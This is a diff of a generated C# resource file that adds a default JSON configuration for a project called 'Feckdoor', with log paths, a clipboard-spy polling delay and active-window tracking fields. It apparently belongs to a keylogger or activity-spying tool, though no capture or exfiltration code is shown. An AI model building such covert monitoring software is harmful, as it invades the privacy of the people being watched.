@@ -61,7 +61,14 @@ namespace Feckdoor.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to .
+        ///   Looks up a localized string similar to {
+        ///	&quot;LogFile&quot;: &quot;D:\\Cache\\Feckdoor.log&quot;,
+        ///	&quot;ErrorLogFile&quot;: &quot;D:\\Cache\\FeckdoorError.log&quot;,
+        ///	&quot;ClipboardSpyDelay&quot;: 200,
+        ///	&quot;TimestampDelay&quot;: 5000,
+        ///	&quot;FallbackWindowName&quot;: &quot;Unknown window&quot;,
+        ///	&quot;FallbackWindowExecutableName&quot;: &quot;Unknown executable&quot;
+        ///}.
         /// </summary>
         internal static string DefaultConfig {
             get {
